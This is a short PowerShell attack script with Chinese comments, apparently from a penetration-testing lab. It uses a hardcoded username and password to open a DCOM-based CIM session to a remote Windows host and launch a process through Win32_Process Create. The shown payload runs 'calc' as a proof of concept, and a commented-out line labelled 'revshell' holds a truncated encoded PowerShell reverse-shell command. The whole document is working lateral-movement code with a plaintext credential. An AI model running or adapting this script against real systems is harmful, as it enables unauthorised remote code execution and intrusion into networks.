# 创建credential 对象
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

# 创建通用信息模型 CIM, 并为wmi会话指定协议为 DCOM
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $options
# revshell
#$command = 'powershell -enc JAB...AD';
# poc
$command = 'calc';

# 使用Win32_Process对象创建进程
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
